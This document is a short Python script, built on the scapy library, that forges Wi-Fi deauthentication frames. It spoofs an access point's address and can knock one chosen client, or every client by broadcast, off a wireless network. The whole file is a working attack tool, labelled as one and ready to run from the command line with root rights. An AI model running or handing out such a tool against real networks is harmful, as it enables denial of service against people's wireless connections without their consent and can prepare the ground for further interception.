#!/usr/bin/env python3
import os
import sys
import time
import argparse
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp


def deauth_attack(ap_mac, target_mac, iface, count=100):
    """
    Sends deauth packets to the target MAC from the access point MAC.
    If target_mac is 'ff:ff:ff:ff:ff:ff', it deauths all clients.
    """
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)

    print(f"🚀 Sending {count} deauth packets from {ap_mac} to {target_mac} via {iface}...")
    sendp(packet, iface=iface, count=count, inter=0.1, verbose=1)


def main():
    parser = argparse.ArgumentParser(description="WiFi Deauthentication Attack Script")
    parser.add_argument("--ap", required=True, help="Access Point (AP) MAC Address")
    parser.add_argument("--target", required=True,
                        help="Target Client MAC Address (use ff:ff:ff:ff:ff:ff for broadcast)")
    parser.add_argument("--iface", required=True, help="Wireless interface in monitor mode")
    parser.add_argument("--count", type=int, default=100, help="Number of deauth packets to send (default=100)")

    args = parser.parse_args()

    if os.geteuid() != 0:
        print("❌ You must run this script as root.")
        sys.exit(1)

    deauth_attack(args.ap, args.target, args.iface, args.count)


if __name__ == "__main__":
    main()
